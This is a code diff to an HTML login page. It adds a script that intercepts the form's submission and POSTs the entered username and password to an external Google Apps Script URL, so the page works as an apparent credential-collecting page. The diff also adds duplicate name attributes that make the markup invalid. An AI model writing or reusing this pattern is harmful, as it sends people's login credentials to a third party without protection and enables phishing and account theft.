@@ -10,15 +10,15 @@
 </head>
 <body>
     <div class="login-container">
-        <form class="login-form">
+        <form name="programing" class="login-form">
             <h2>Login</h2>
             <div class="input-group">
                 <label for="username">Username</label>
-                <input type="text" id="username" name="username" required>
+                <input type="text" id="username" name="username" name="nama" required>
             </div>
             <div class="input-group">
                 <label for="password">Password</label>
-                <input type="password" id="password" name="password" required>
+                <input type="password" id="password" name="password" name="password" required>
             </div>
             <button type="submit" id="submitBtn">Login</button>
             
@@ -29,5 +29,17 @@
             <p id="loading-message" class="loading-message" style="display: none;">Submitting...</p>
  </form>
     </div>
+
+    <script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycbx2-ITt5b7Y9puSf4Qt7O4rHiOxKUbqxEPghv8sYexASW7G936knvANCc_PCkstW6j8/exec' ;
+  const form = document.forms['programing']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+</script>
 </body>
 </html>
